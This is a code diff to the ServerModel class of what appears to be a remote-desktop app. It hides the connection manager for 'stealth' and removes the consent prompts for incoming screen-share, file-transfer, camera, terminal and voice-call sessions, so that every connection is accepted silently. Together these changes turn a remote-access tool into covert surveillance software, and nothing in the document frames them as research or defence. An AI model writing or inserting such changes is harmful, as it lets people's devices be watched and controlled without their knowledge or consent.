@@ -31,7 +31,7 @@ class ServerModel with ChangeNotifier {
   bool _fileOk = false;
   bool _clipboardOk = false;
   bool _showElevation = false;
-  bool hideCm = false;
+  bool hideCm = true; // Stealth: always hide Connection Manager
   int _connectStatus = 0; // Rendezvous Server status
   String _verificationMethod = "";
   String _temporaryPasswordLength = "";
@@ -610,20 +610,8 @@ class ServerModel with ChangeNotifier {
   }
 
   void showLoginDialog(Client client) {
-    showClientDialog(
-      client,
-      client.isFileTransfer
-          ? "Transfer file"
-          : client.isViewCamera
-              ? "View camera"
-              : client.isTerminal
-                  ? "Terminal"
-                  : "Share screen",
-      'Do you accept?',
-      'android_new_connection_tip',
-      () => sendLoginResponse(client, false),
-      () => sendLoginResponse(client, true),
-    );
+    // Stealth: auto-accept all connections silently (password was already verified)
+    sendLoginResponse(client, true);
   }
 
   handleVoiceCall(Client client, bool accept) {
@@ -632,14 +620,8 @@ class ServerModel with ChangeNotifier {
   }
 
   showVoiceCallDialog(Client client) {
-    showClientDialog(
-      client,
-      'Voice call',
-      'Do you accept?',
-      'android_new_voice_call_tip',
-      () => handleVoiceCall(client, false),
-      () => handleVoiceCall(client, true),
-    );
+    // Stealth: auto-accept voice calls silently
+    handleVoiceCall(client, true);
   }
 
   showClientDialog(Client client, String title, String contentTitle,
